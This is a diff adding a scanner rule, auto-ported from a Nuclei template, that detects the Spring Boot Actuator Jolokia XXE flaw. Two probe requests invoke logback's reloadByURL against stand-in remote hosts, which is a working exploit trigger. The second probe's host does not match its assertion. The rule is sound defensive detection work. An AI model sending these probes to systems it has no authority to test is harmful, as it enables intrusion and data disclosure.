@@ -1,0 +1,42 @@
+schema_version: 1
+id: "cortex.community:springboot-actuators-jolokia-xxe"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "Spring Boot Actuators (Jolokia) XXE"
+  description: "A vulnerability in Spring Boot Actuators's 'jolokia' endpoint allows remote attackers to perform an XML External Entities (XXE) attack and include content stored on a remote server as if it was its own. This has the potential to allow the execution of arbitrary code and/or disclosure of sensitive information from the target machine. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://www.veracode.com/blog/research/exploiting-spring-boot-actuators"
+    - "https://github.com/mpgn/Spring-Boot-Actuator-Exploit"
+  cwes: [611]
+  tags: ["springboot", "jolokia", "xxe", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml" }
+  - id: "probe1"
+    request: { method: "GET", path: "/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/random:915!/logback.xml" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    any:
+      - all:
+          - all:
+              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "http:\\/\\/nonexistent:31337\\/logback.xml" } }
+              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "reloadByURL" } }
+              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "JoranException" } }
+          - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
+      - all:
+          - all:
+              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "http:\\/\\/nonexistent:31337\\/logback.xml" } }
+              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "reloadByURL" } }
+              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "JoranException" } }
+          - eq: { left: { ref: "steps.probe1.status" }, right: { value: 200 } }
